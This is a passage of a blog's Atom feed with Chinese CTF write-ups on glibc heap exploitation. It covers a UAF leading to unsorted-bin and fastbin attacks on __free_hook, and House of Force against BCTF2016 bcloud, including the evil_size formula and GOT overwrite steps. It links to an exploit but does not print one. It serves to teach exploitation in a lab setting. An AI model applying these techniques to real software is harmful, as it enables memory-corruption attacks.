&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200712102723178.png&quot; alt=&quot;image-20200712102723178&quot;&gt;&lt;/p&gt;
&lt;p&gt;flag：标识该节点是否存在&lt;/p&gt;
&lt;p&gt;size：记录大小&lt;/p&gt;
&lt;p&gt;content：数据块指针&lt;/p&gt;
&lt;p&gt;程序有以下功能&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1. Insert&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2. Update&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3. Merge&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4. Delete&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5. View&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6. List&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7. Exit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;insert：获取数据块大小，并读入数据。数据块大小在128~4096这个范围内&lt;/p&gt;
&lt;p&gt;update：对数据块进行大小内容进行更新&lt;/p&gt;
&lt;p&gt;merge：将两节点合并。这里存在漏洞，输入两次相同的id，导致UAF。这个漏洞我没发现，思维还不够猥琐啊&lt;/p&gt;
&lt;p&gt;delete：释放数据块，清空节点&lt;/p&gt;
&lt;h3 id=&quot;总体思路&quot;&gt;&lt;a href=&quot;#总体思路&quot; class=&quot;headerlink&quot; title=&quot;总体思路&quot;&gt;&lt;/a&gt;总体思路&lt;/h3&gt;&lt;p&gt;通过UAF，首先泄露libc基址，然后修改其bk指针，使用unsorted bin attack修改global_max_fast变量；fastbin bin attack覆写&lt;code&gt;__free_hook&lt;/code&gt;为system函数地址。&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://hhdx.xyz/tags/CTF/"/>
    
    <category term="how2heap" scheme="http://hhdx.xyz/tags/how2heap/"/>
    
  </entry>
  
  <entry>
    <title>How2heap--house_of_force Bctf2016--bcloud</title>
    <link href="http://hhdx.xyz/2020/07/07/How2heap-house-of-force-Bctf2016-bcloud/"/>
    <id>http://hhdx.xyz/2020/07/07/How2heap-house-of-force-Bctf2016-bcloud/</id>
    <published>2020-07-07T06:46:39.000Z</published>
    <updated>2020-10-24T13:21:30.870Z</updated>
    
    <content type="html"><![CDATA[<h2 id="House-of-force"><a href="#House-of-force" class="headerlink" title="House of force"></a>House of force</h2><p>溢出修改topchunk的size，分配一个使size_t溢出的evil_size，使下一次分配在目标位置，进行修改。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):</span></span><br><span class="line"><span class="comment">* new_top = old_top + nb</span></span><br><span class="line"><span class="comment">* nb = new_top - old_top</span></span><br><span class="line"><span class="comment">* req + 2sizeof(long) = new_top - old_top</span></span><br><span class="line"><span class="comment">* req = new_top - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment">* req = dest - 2sizeof(long) - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment">* req = dest - old_top - 4*sizeof(long)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="Bctf2016-bcloud"><a href="#Bctf2016-bcloud" class="headerlink" title="Bctf2016 bcloud"></a>Bctf2016 bcloud</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8047000)</span><br></pre></td></tr></table></figure><p>程序一开始让输入name、org、hostname，输入字符串函数存在null byte overflow。</p><p>输入name函数中，字符串数组在栈中后部紧邻指针变量，所以strcpy会将该指针一并拷贝入0x40的空间（实际可用0x44），并且null byte覆盖topchunk的最低字节。可以泄露堆的地址</p><p>输入org、hostname函数中，存在同样问题，可覆盖的更多的字节。可以覆盖topchunk的size</p><a id="more"></a><p><strong>程序功能菜单</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.New note</span><br><span class="line">2.Show note</span><br><span class="line">3.Edit note</span><br><span class="line">4.Delete note</span><br><span class="line">5.Syn</span><br><span class="line">6.Quit</span><br></pre></td></tr></table></figure><p>new note: 读入size存入全局数组，分配size+4的空间将指针也存入全局数组，读入字符串</p><p>show note: 打印<code>WTF? Something strange happened.</code></p><p>edit note: 修改存储的内容，根据size数组和指针数组</p><p>delete note: free分配的空间</p><p>syn: 修改sync标识。在这里没用</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>在input_name函数中，泄露堆的地址，由此可以计算evil_size；在input_orghost中覆盖topchunk的size为0xffffffff。使用atoi_got、free_got覆盖bss段所存储的全局指针数组，使用edit note函数将free_got处修改为puts_plt，使用delete note函数泄露libc base，最后使用edit note 修改atoi_got为system函数地址。</p><h3 id="House-of-force-1"><a href="#House-of-force-1" class="headerlink" title="House of force"></a>House of force</h3><p>这个手法还是比较简单的，就是一开始没有找到漏洞。。只发现了null byte overflow。</p><p>使用input_orghost函数覆盖topchunk-&gt;size为0xffffffff，接下来就是计算evil_size了。</p><p>泄露的heap地址为分配的第一个0x40地址，称之为leak_heap。leak_heap+0x40就是此时的topchunk，后来又分配了两个0x40，此时<code>topchunk = leak_heap + 0x40 + 0x48*2</code>。到目标地址，还需要分配两个chunk，也就有两个8字节的头，new note中又加了4字节，所以<code>evil_size = dest_addr - topchunk - 8*2 - 4</code>。</p><p>exp中，直接发送这个负值就可以，int到size_t，其中所存的数字没有变化，只是两种类型的解读不一样。原来我想发送unsigned值(evil_size&amp;0xffffffff)，结果发现32位程序中atoi只会将其解析为4字节int最大的正数，即0x7fffffff。</p><p><a href="https://github.com/clxsh/ctf_wps/blob/master/others/bctf2016%20bcloud/exp.py">exploit</a></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol><li>how2heap house_of_force.c</li><li><a href="https://uaf.io/exploitation/2016/03/20/BCTF-bcloud.html">https://uaf.io/exploitation/2016/03/20/BCTF-bcloud.html</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;House-of-force&quot;&gt;&lt;a href=&quot;#House-of-force&quot; class=&quot;headerlink&quot; title=&quot;House of force&quot;&gt;&lt;/a&gt;House of force&lt;/h2&gt;&lt;p&gt;溢出修改topchunk的size，分配一个使size_t溢出的evil_size，使下一次分配在目标位置，进行修改。&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/*&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;* The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;* new_top = old_top + nb&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;* nb = new_top - old_top&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;* req + 2sizeof(long) = new_top - old_top&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;* req = new_top - old_top - 2sizeof(long)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;* req = dest - 2sizeof(long) - old_top - 2sizeof(long)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;* req = dest - old_top - 4*sizeof(long)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;Bctf2016-bcloud&quot;&gt;&lt;a href=&quot;#Bctf2016-bcloud&quot; class=&quot;headerlink&quot; title=&quot;Bctf2016 bcloud&quot;&gt;&lt;/a&gt;Bctf2016 bcloud&lt;/h2&gt;&lt;h3 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Arch:     i386-32-little&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;RELRO:    Partial RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Stack:    Canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;NX:       NX enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;PIE:      No PIE (0x8047000)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;程序一开始让输入name、org、hostname，输入字符串函数存在null byte overflow。&lt;/p&gt;
&lt;p&gt;输入name函数中，字符串数组在栈中后部紧邻指针变量，所以strcpy会将该指针一并拷贝入0x40的空间（实际可用0x44），并且null byte覆盖topchunk的最低字节。可以泄露堆的地址&lt;/p&gt;
&lt;p&gt;输入org、hostname函数中，存在同样问题，可覆盖的更多的字节。可以覆盖topchunk的size&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://hhdx.xyz/tags/CTF/"/>
    
    <category term="how2heap" scheme="http://hhdx.xyz/tags/how2heap/"/>
    
  </entry>
  
</feed>
